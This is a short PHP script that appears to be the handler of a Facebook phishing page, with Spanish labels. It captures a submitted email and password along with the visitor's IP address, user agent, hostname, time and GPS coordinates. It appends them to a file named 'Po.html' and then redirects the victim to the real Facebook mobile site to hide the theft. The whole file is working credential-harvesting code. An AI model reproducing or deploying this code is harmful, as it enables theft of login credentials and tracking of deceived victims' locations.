<?php

date_default_timezone_set("Mexico/General");
$habbo = $_POST['email']; 
$password = $_POST['pass'];                                    $ip = $_SERVER['REMOTE_ADDR'];
$fecha = date("d-m-Y");
$hora = time();
$useragent=$_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$lati=(isset($_POST['lati']))?$_POST['lati']:'';
$longi=(isset($_POST['longi']))?$_POST['longi']:'';
$f = fopen("Po.html", "a"); 
fwrite ($f, ' 

<h2>
Email: [  <b><font color="#2E2EFE">'.$habbo.'</font></b>  ] <br> 
Contraseña: [  <b><font color="#7B68EE">'.$password.'</font></b>  ] <br> 
IP: [  <b><font color="#6A5ACD">'.$ip.'</font></b>  ] <br> Fecha: [  <b><font color="#FF8000">'.$fecha.'</font></b>  ] <br> 
Hora:[  <b><font color="purple">' . date ("H:i:s",time()) . '</font></b>] <br> Dispositivo:[  <b><font color="green">' . $useragent . '</font></b>   ] <br>  Hostname:[  <b><font color="red">' . $hostname . '</font></b> ] <br>
Latitud:[  <b><font color="blue">'.$lati.'</font></b> ] <br>
Longitud:[  <b><font color="blue">'.$longi.'</font></b>   ] <br> </h2>');
fclose($f);

header("Location: https://m.facebook.com");
 
?>